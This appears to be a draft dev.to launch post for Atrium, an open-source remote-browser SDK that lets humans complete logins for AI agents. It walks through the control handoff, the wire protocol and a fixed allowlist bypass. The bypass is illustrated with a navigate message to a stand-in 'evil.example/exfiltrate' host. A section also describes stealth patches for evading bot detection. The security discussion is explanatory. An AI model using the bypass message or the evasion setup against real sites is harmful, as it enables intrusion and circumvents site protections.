# Atrium — dev.to long-form post

> Title and tags below the divider. Publish on Day 0 around 1pm PT (after HN momentum is clear). dev.to ranks for SEO — this post lives forever and will pull in tail traffic for months.

---

**Title**: Why I built an open-source remote browser for AI agents (and what I learned)

**Tags**: `opensource` `webdev` `javascript` `react` (4 is the dev.to cap, pick the highest-traffic four)

**Cover image**: `assets/brand/og-image-final.svg` rendered as PNG, or the demo GIF if it exists. 1000×420 minimum.

**Canonical URL**: leave blank (this _is_ the canonical).

---

# Why I built an open-source remote browser for AI agents (and what I learned)

Every AI browser agent demo I've watched dies at the same step.

The agent walks up to a Google sign-in. Or a Twitter login. Or a Slack OAuth screen. Or a captcha. Or a passkey prompt. And the demo cuts to "now we have credentials in our config." Off-camera, somebody handled it. The agent didn't.

This is not a small wrinkle. Every production scraper, every onboarding flow, every "automate this for me" workflow eventually hits a third-party login. And the third party — by design, by regulatory requirement, by the simple fact that they're not your customer — will always demand a human.

The shapes of the workarounds today are all bad:

- **Ask the user for their password and store it.** Don't. This is how breach reports happen.
- **Proxy the entire login UI through your service.** You're building a man-in-the-middle that the security team will write you up for next quarter.
- **Skip the feature.** Leave money on the table.
- **Pay Browserbase or Steel.** Both are great products. But your control plane runs on their infrastructure.

There's a fourth shape. **Stream a real Chromium session to the user, let them sign in directly, and capture the session state afterward.** The user's password never crosses your service. You get cookies and Playwright `storageState` back. Your agent resumes.

I built [Atrium](https://github.com/ohmaseclaro/atrium) over the last few months as the open-source version of that fourth shape. v0.3.0 just shipped. This is the engineering story.

## The shape of the thing

Atrium ships as three npm packages that fit together but don't have to:

- `@atriumjs/express` — middleware you mount in your existing Express app. Exposes session-management HTTP routes and a viewer WebSocket relay.
- `@atriumjs/worker` — a Node process that runs Chromium under Playwright, accepts an inbound dial from the API tier, and streams JPEG screencast frames over a WebSocket.
- `@atriumjs/react` — a `<RemoteBrowser />` component that renders the screencast into a canvas, forwards mouse/keyboard/wheel/IME events back, and exposes an imperative handle.

A toy integration is three lines:

```ts
import { atrium } from "@atriumjs/express";

const { router, handleViewerUpgrade } = atrium({
  authorize: async (req) => ({ tenantId: "t1", userId: "u1" }),
  policies: { sessionTtlMs: 600_000, urlAllowlist: ["accounts.google.com"] },
  workerDialBase: process.env.ATRIUM_WORKER_DIAL_BASE!,
  workerSharedSecret: process.env.ATRIUM_WORKER_SECRET!,
});

app.use("/atrium", router);
server.on("upgrade", handleViewerUpgrade);
```

And on the React side:

```tsx
<RemoteBrowser session={session} onClose={() => /* …*/} />
```

That's the SDK. The interesting work is everything that prevents that SDK from being terrible.

## The control handoff

The interesting state in this system is one boolean per session: **who is allowed to send input right now?** The agent, or the human?

Easy in the abstract. Brutally finicky in practice:

- A viewer reconnects mid-handoff (their laptop sleeps, their wifi flips). On the new socket, do they own control or not?
- The agent issues a control-request while a human is still typing. Should the human's next keystroke land? Should the agent's request be queued?
- The user opens a second tab to the same session URL. (They shouldn't, but they will.) Both viewers see "you have control." If they both type, what happens?
- The control state is `agent`, and the agent crashes. What's the timeout?

The shape that worked is **server-authoritative state with idempotent transitions**. The client doesn't own the control flag. It sends `request_control` and `release_control` over the viewer WebSocket. The server applies the transition (or doesn't — there's a small state machine), then broadcasts the new control state to every connected viewer. The viewer renders what the server says. Reconnects are no-ops: the server doesn't even know there was a reconnect.

Getting this right ate about a third of the total implementation time. The naive "first writer wins" approach worked 80% of the time. The remaining 20% is where the bugs live: blur-during-modifier-held, visibilitychange-during-IME-composition, two-viewers-one-session, pointer-cancel-mid-drag, reconnect-during-control-handoff. Every one was a real bug fix; every one was 20 lines of code; every one is regression-tested.

If you're building anything that has a "who has the floor right now" model — collaborative editing, voice rooms, multiplayer games — the lesson is the same: **the participant who stays alive longer is the one who owns the canonical state**.

## The wire protocol

I tried two designs before the current one stuck.

**Attempt 1: raw CDP from the React component.** The viewer would open a WebSocket directly to the worker and speak Chrome DevTools Protocol. This is what some hacky tutorials online suggest.

It doesn't work. CDP is a privileged debugging protocol. Exposing it to a browser tab is like exposing `sudo` to your TV remote. Worse, CDP has 400+ commands and events spread across 30+ domains — your React component would have to implement enough of them to be useful, and every Chrome version bump risks breaking your client.

**Attempt 2: full BullMQ-style job allocator from day one.** The API tier writes a "create session" job to Redis; a pool of workers consumes the queue; workers report back over a callback URL. Properly scalable, properly distributed.

Also wrong, for v0.3.0. The latency hit (job-queue insert + worker poll + callback) is meaningful on a session-creation hot path that should feel instant. And the whole thing is operational complexity I didn't need to design before I had users.

**The current design: API dials worker over WebSocket.** When a viewer arrives, the API tier opens a WebSocket to `workerDialBase + /internal/stream/:sessionId`, authenticates with a shared secret, and acts as a relay between the viewer's browser WebSocket and the worker's screencast WebSocket. The worker has no Redis, no queue, no callback dance. The API tier is stateless — any node can serve any session because the worker dial base is global config.

The downside: one node can't allocate a session to a worker on another node without coordination. We'll need BullMQ (or equivalent) for that, eventually. For now, "one worker per session, dialed when needed" is good enough through about 50 concurrent sessions per node.

Wire-protocol detail lives in [`packages/protocol/`](https://github.com/ohmaseclaro/atrium/tree/main/packages/protocol) (Zod schemas, every message type) and the design doc at [`docs/remote-browser-design.md`](https://github.com/ohmaseclaro/atrium/blob/main/docs/remote-browser-design.md).

## The security regression I almost shipped

This one's instructive enough that I keep it at the top of my "things to remember next sprint" notes.

The React component exposes an imperative handle so consumers can do things like `remoteBrowser.current.navigate("https://accounts.google.com")` programmatically. Useful for tests; polite for the SDK ergonomics.

I implemented it the obvious way: the `navigate()` method sends a `{ t: "navigate", url }` message over the viewer WebSocket. The worker receives it, calls `page.goto(url)`, and emits frames.

A few days later I added a `policies.urlAllowlist` config that restricts which origins a session can navigate to — for a public demo this is essential. I tested it against `POST /sessions` (the bootstrap URL) and against the worker's own `goto` calls. Green.

Then it hit me: **the React `navigate()` method bypasses the allowlist.** A viewer with a valid session token can post `{ t: "navigate", url: "https://evil.example/exfiltrate" }` over their WebSocket, the API tier dutifully forwards it to the worker, and Chromium navigates anywhere.

The fix was filtering at the relay layer, not at the worker. Five lines in [`packages/core/src/url-allowlist.ts`](https://github.com/ohmaseclaro/atrium/blob/main/packages/core/src) and the matching test cases for inbound viewer messages. The allowlist is now enforced in three places: the bootstrap call, the relay-layer filter on inbound navigates, and (defense in depth) the worker before `goto`.

The general lesson: **every imperative method on a relay client is a potential filter bypass**. If your SDK is chatty, your filter has to be exhaustive. Default to "client proposes, server disposes" no matter how nice the SDK feels.

## Why Playwright, why headed Chromium, why stealth

Three choices that cost time to make and cost lines of code to undo if wrong.

**Playwright vs raw CDP.** I covered this above — Playwright won because of BrowserContext, `storageState`, and the test ecosystem. Raw CDP would have been ~3× the code.

**Headed Chromium by default, headless opt-in.** The temptation to default to headless is huge — no display, less memory, easier to operate. But every modern bot-detection vendor (Cloudflare, hCaptcha, Akamai, PerimeterX) flags headless via a dozen signals. The session has to look like a real desktop user, which means a real display.

The workaround on Linux servers is Xvfb. Atrium's Docker image ships with Xvfb installed and `entrypoint.sh` starts `Xvfb :99` before launching Node. Chromium gets a fake display, the bot detector gets a real user.

**playwright-extra + puppeteer-extra-plugin-stealth.** Adds an opinionated set of CDP patches that hide the most obvious automation tells (`navigator.webdriver = false`, plausible languages array, plausible plugins array, etc.). It's not bulletproof, but it raises the noise floor enough that the harder fingerprinting questions become "is this someone using an automation extension" rather than "is this a bot." Real users use automation extensions. Bots get blocked.

If you don't want it, `ATRIUM_STEALTH=0`.

## What's not done

I want this part louder than the "what's done" part, because pre-1.0 OSS marketing is allergic to honesty:

- **Fastify / Hono / Next / NestJS adapters.** Designed, not shipped. The middleware shape in `@atriumjs/express` cleanly factors into a framework-agnostic `@atriumjs/core` plus a thin Express wrapper, but the other wrappers don't exist yet. PRs welcome.
- **BullMQ-backed allocator.** The dial-from-API-to-worker pattern hits a wall around 50 concurrent sessions per node. The path forward is documented in [`docs/atrium-v2-design.md`](https://github.com/ohmaseclaro/atrium/blob/main/docs/atrium-v2-design.md).
- **Multi-region demo orchestration.** Right now demo.atriumjs.dev is one node in one region. Multi-region needs the BullMQ allocator first.
- **A hosted version.** Not on the roadmap. Atrium is meant to run on your infra. If "give us your laptop" is a hard requirement, use Browserbase or Steel.

## How to try it

Live demo: [demo.atriumjs.dev](https://demo.atriumjs.dev). Rate-limited; locked to a single X login flow because shipping a public proxy would be irresponsible. You can sign in to X, post a tweet, and watch the agent capture the cookies.

Local:

```bash
git clone https://github.com/ohmaseclaro/atrium.git
cd atrium
pnpm install
pnpm exec playwright install chromium
pnpm demo
# open http://127.0.0.1:3333
```

npm:

```bash
npm install express @atriumjs/express @atriumjs/react @atriumjs/worker
npm install react react-dom
npx playwright install chromium
```

There's a [quick start](https://github.com/ohmaseclaro/atrium/blob/main/docs/quick-start.md) and a longer [user guide](https://github.com/ohmaseclaro/atrium/blob/main/docs/user-guide.md). The design doc is the thing to read if you want to argue with the architecture.

## The ask

If you're building agents, scrapers, or onboarding flows that hit captchas, OAuth, or MFA — try Atrium and tell me what breaks. Open a [discussion](https://github.com/ohmaseclaro/atrium/discussions) or file an issue.

If you're already running something like this on infrastructure you control and want to compare notes on the wire-protocol design, I'd love to chat.

If you're a Playwright or browser-automation maintainer, I'd be especially grateful for a code review of [`packages/worker/`](https://github.com/ohmaseclaro/atrium/tree/main/packages/worker) — the CDP screencast bridge is the most fragile piece.

MIT. github.com/ohmaseclaro/atrium. v0.3.0 on npm.
